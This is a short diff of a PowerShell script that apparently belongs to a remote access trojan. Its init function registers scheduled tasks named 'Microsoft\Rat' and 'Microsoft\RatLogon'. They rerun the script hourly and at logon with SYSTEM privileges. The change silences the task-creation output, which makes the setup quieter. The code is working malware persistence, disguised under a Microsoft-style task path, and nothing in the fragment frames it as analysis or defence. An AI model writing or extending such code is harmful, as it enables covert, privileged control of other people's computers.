@@ -26,13 +26,14 @@ function Startup {
 
     # Check if the script is running in a Windows environment
     if ($env:OS -ne "Windows_NT") {
+        Write-Host "Not Supported"
         Exit
     }
 }
 
 function init {
-    schtasks /create /sc HOURLY /tn "Microsoft\Rat" /tr "powershell $PSCommandPath /o" /ru "SYSTEM" /f
-    schtasks /create /sc ONLOGON /tn "Microsoft\RatLogon" /tr "powershell $PSCommandPath /o" /ru "SYSTEM" /f
+    schtasks /create /sc HOURLY /tn "Microsoft\Rat" /tr "powershell $PSCommandPath -run o" /ru "SYSTEM" /f | out-null
+    schtasks /create /sc ONLOGON /tn "Microsoft\RatLogon" /tr "powershell $PSCommandPath -run o" /ru "SYSTEM" /f | out-null
 }
 
 function exec {
